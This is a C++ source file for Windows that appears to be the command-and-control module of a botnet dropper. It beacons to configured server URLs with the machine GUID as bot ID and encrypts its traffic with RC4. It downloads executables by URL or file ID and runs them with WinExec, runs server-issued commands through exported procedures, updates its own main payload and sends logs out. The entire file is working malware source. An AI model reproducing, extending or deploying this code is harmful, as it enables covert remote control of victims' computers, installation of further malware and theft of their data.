#include <intrin.h>
#include <stdio.h>
#include <windows.h>
#include <shlwapi.h>
#include <psapi.h>
#include <imagehlp.h>
#include <tlhelp32.h>
#include <Shlwapi.h>
#include <shlobj.h>
#include <wininet.h>
#include <Urlmon.h>

#include "dropper.h"
#include "server.h"
#include "protect.h"
#include "config.h"

#include "utils.h"

CHAR g_CurrentServerUrl[MAX_PATH] = {0};

// Commands
//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOLEAN DownloadRunExeUrl(DWORD TaskId, PCHAR FileUrl)
{
	BOOLEAN Result = TRUE;
	CHAR chTempPath[MAX_PATH];
	CHAR chTempName[MAX_PATH];

	Protect::GetStorageFolderPath(chTempPath);
	GetTempFileName(chTempPath, NULL, GetTickCount(), chTempName);
	PathRemoveExtension(chTempName);
	PathAddExtension(chTempName, ".exe");

	if (SUCCEEDED(URLDownloadToFile(NULL, FileUrl, chTempName, 0, NULL)))
	{
		if (WinExec(chTempName, 0) < 31)
		{
			DbgMsg(__FUNCTION__"(): WinExec: %x\n", GetLastError());
		}
	}
	else
	{
		DbgMsg(__FUNCTION__"(): URLDownloadToFile: %x\n", GetLastError());
	}

	if (TaskId) Server::SendServerAnswer(TaskId, g_CurrentServerUrl, 1, 0);

	return Result;
}

BOOLEAN WriteFileAndExecute(PVOID File, DWORD Size)
{
	CHAR chTempPath[MAX_PATH];
	CHAR chTempName[MAX_PATH];

	Protect::GetStorageFolderPath(chTempPath);
	GetTempFileName(chTempPath, NULL, GetTickCount(), chTempName);
	PathRemoveExtension(chTempName);
	PathAddExtension(chTempName, ".exe");

	if (Utils::FileWrite(chTempName, CREATE_ALWAYS, File, Size))
	{
		WinExec(chTempName, 0);

		return TRUE;
	}

	return FALSE;
}

BOOLEAN DownloadRunExeId(DWORD TaskId, DWORD FileId)
{
	BOOLEAN Result = FALSE;
	DWORD dwLastError;
	DWORD Size;
	PVOID Buffer;

	if (Buffer = Server::DownloadFileById(FileId, g_CurrentServerUrl, &Size))
	{
		Result = WriteFileAndExecute(Buffer, Size);
		dwLastError = GetLastError();

		free(Buffer);
	}

	if (TaskId) Server::SendServerAnswer(TaskId, g_CurrentServerUrl, 1, 0);

	//if (TaskId) Server::SendServerAnswer(TaskId, g_CurrentServerUrl, Result, dwLastError);

	return Result;
}

BOOLEAN DownloadUpdateMain(DWORD TaskId, DWORD FileId, DWORD FileVersion)
{
	BOOLEAN Result = FALSE;
	DWORD Size;
	PVOID Buffer;
	DWORD dwLastError;

	if (Config::ReadInt(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_VERSION) < FileVersion)
	{
		if (Buffer = Server::DownloadFileById(FileId, g_CurrentServerUrl, &Size))
		{
			if (Result = Protect::UpdateMain(Buffer, Size))
			{
				Config::WriteInt(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_VERSION, FileVersion);
			}

			dwLastError = GetLastError();

			free(Buffer);
		}
		else
		{
			DbgMsg(__FUNCTION__"(): e2\n");
		}
	}
	else
	{
		DbgMsg(__FUNCTION__"(): e1\n");
	}

	if (TaskId) Server::SendServerAnswer(TaskId, g_CurrentServerUrl, Result, dwLastError);

	return Result;
}

BOOLEAN WriteConfigString(DWORD TaskId, PCHAR Section, PCHAR Variable, PCHAR String)
{
	BOOLEAN Ret =  Config::WriteString(Section, Variable, String);

	if (TaskId) Server::SendServerAnswer(TaskId, g_CurrentServerUrl, 1, 0);

	return Ret;
}

DWORD SendLogs(DWORD TaskId)
{
	PVOID Buffer;
	PVOID Logs;
	DWORD Len;
	BOOLEAN b;

	if (Logs = Utils::ReadLogsFromFile(&Len))
	{
		if (Buffer = Server::SendRequest(g_CurrentServerUrl, SRV_TYPE_LOG, (PCHAR)Logs, Len, FALSE, NULL, &b)) free(Buffer);

		free(Logs);
	}

	return 0;
}

// Server
//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Server::SendLogsToServer()
{
	Config::ReadConfig();

	CHAR Buffer[MAX_PATH*4];

	if (Config::ReadString(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_SRVURLS, Buffer, RTL_NUMBER_OF(Buffer)))
	{
		PCHAR CfgServerUrls = Buffer;
		PCHAR ServerUrl;

		while (Utils::StringTokenBreak(&CfgServerUrls, ";", &ServerUrl))
		{
			strcpy(g_CurrentServerUrl, ServerUrl);

			SendLogs(0);

			free(ServerUrl);
		}
	}
}

VOID Server::SendServerAnswer(DWORD TaskId, PCHAR ServerUrl, BOOLEAN Result, DWORD LastError)
{
	CHAR Answer[MAX_PATH];
	PVOID Buffer;
	DWORD Len;
	BOOLEAN b;

	Len = _snprintf(Answer, RTL_NUMBER_OF(Answer), "tid=%d&ta=%s-%x", TaskId, Result ? "OK" : "Err", Result ? 0 : LastError);

	if (Buffer = Server::SendRequest(ServerUrl, SRV_TYPE_TASKANSWER, Answer, Len, FALSE, NULL, &b)) free(Buffer);
}

PVOID Server::DownloadFileById(DWORD FileId, PCHAR ServerUrl, PDWORD pSize)
{
	CHAR Request[MAX_PATH];
	DWORD Len;
	BOOLEAN b;

	Len = _snprintf(Request, RTL_NUMBER_OF(Request), "fid=%d", FileId);
	
	return Server::SendRequest(ServerUrl, SRV_TYPE_LOADFILE, Request, Len, FALSE, pSize, &b);
}

PCHAR Server::SendRequest(PCHAR ServerUrl, DWORD Type, PCHAR Request, DWORD RequestLen, BOOLEAN Wait, PDWORD Size, PBOOLEAN pbok)
{
	PVOID Result = NULL;
	WINET_LOADURL LoadUrl = {0};
	PCHAR BotId = Drop::GetMachineGuid();
	CHAR chHost[MAX_PATH] = {0};
	DWORD dwHost = RTL_NUMBER_OF(chHost)-1;
	PCHAR FullRequest;

	*pbok = FALSE;
	if (FullRequest = (PCHAR)malloc(RequestLen + 100))
	{
		DWORD Len = sprintf(FullRequest, "%s|%d|", Drop::GetMachineGuid(), Type);
		CopyMemory(FullRequest + Len, Request, RequestLen);
		Len += RequestLen;

		LoadUrl.pcMethod = "POST";
		LoadUrl.pcUrl = ServerUrl;
		if (SUCCEEDED(UrlGetPart(ServerUrl, chHost, &dwHost, URL_PART_HOSTNAME, 0)))
		{
			LoadUrl.dwPstData = Len;
			if (LoadUrl.pvPstData = Utils::UtiCryptRc4M(chHost, dwHost, FullRequest, Len))
			{
				LoadUrl.dwRetry = Config::ReadInt(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_SRVRETRY);

				PVOID Buffer = Wait ? WinetLoadUrlWait(&LoadUrl, 2*60) : WinetLoadUrl(&LoadUrl);
				if (Buffer)
				{
					Utils::UtiCryptRc4(BotId, lstrlen(BotId), Buffer, Buffer, LoadUrl.dwBuffer);

					if ((RtlCompareMemory(Buffer, "OK\r\n", 4) == 4))
					{
						*pbok = TRUE;

						if (LoadUrl.dwBuffer > 4)
						{
							if (Result = malloc(LoadUrl.dwBuffer - 3))
							{
								CopyMemory(Result, (PCHAR)Buffer + 4, LoadUrl.dwBuffer - 4);
								((PCHAR)Result)[LoadUrl.dwBuffer - 4] = 0;
								if (Size) *Size = LoadUrl.dwBuffer - 4;
							}
						}
					}

					free(Buffer);
				}

				free(LoadUrl.pvPstData);
			}
		}

		free(FullRequest);
	}

	return (PCHAR)Result;
}

DWORD Server::ProcessServerAnswer(PCHAR Buffer)
{
	PCHAR CurrentCommand;
	PCHAR Commands = Buffer;

	while (Utils::StringTokenBreak(&Commands, "\r\n", &CurrentCommand))
	{
		CHAR Module[MAX_PATH] = {0};
		CHAR Procedure[MAX_PATH] = {0};
		CHAR Parameters[MAX_PATH] = {0};

		DWORD Scaned = sscanf(CurrentCommand, "%[^.].%[^(](%[^)])", Module, Procedure, Parameters);
		if (Scaned == 3 || Scaned == 2)
		{
			PVOID ModuleBase = Drop::CurrentImageBase;
			if (ModuleBase)
			{
				DWORD_PTR Result = Utils::ExecExportProcedure(ModuleBase, Procedure, Parameters);

				DbgMsg(__FUNCTION__"(): Command '%s' = %x\n", CurrentCommand, Result);
			}
		}

		free(CurrentCommand);
	}

	free(Buffer);

	return 0;
}

BOOLEAN Server::SendReport(PCHAR ServerUrl)
{
	CHAR BuildId[50];
	CHAR WinVer[50];
	CHAR Request[MAX_PATH*4] = {0};
	PCHAR Buffer;
	DWORD Len;
	BOOLEAN pbOK = FALSE;

	Config::ReadString(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_BUILDID, BuildId, RTL_NUMBER_OF(BuildId));
	Utils::GetWindowsVersion(WinVer, RTL_NUMBER_OF(WinVer)-1);	
	Len = _snprintf(Request, RTL_NUMBER_OF(Request)-1, "os=%s&bid=%s", WinVer, BuildId);
	if (Buffer = Server::SendRequest(ServerUrl, SRV_TYPE_REPORT, Request, Len, TRUE, &Len, &pbOK))
	{
		DbgMsg(__FUNCTION__"(): Buffer '%s'\n", Buffer);

		Utils::ThreadCreate(Server::ProcessServerAnswer, Buffer, NULL);
	}

	return pbOK;
}

DWORD Server::ServerLoopThread(PVOID Context)
{
	for (;;)
	{
		CHAR Buffer[MAX_PATH*4];

		if (Config::ReadString(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_SRVURLS, Buffer, RTL_NUMBER_OF(Buffer)))
		{
			PCHAR CfgServerUrls = Buffer;
			PCHAR ServerUrl;

			while (Utils::StringTokenBreak(&CfgServerUrls, ";", &ServerUrl))
			{
				if (ServerUrl && ServerUrl[0])
				{
					strcpy(g_CurrentServerUrl, ServerUrl);

					if (Server::SendReport(ServerUrl))
					{
						DbgMsg(__FUNCTION__"(): SendReport '%s' ok\n", ServerUrl);

						break;
					}
					else
					{
						DbgMsg(__FUNCTION__"(): SendReport '%s' no answer\n", ServerUrl);
					}
				}

				free(ServerUrl);
			}

			DbgMsg(__FUNCTION__"(): Sleep: '%d' min\n", Config::ReadInt(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_SRVDELAY));

			Sleep(1000 * 60 * Config::ReadInt(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_SRVDELAY));
		}
	}

	return 0;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

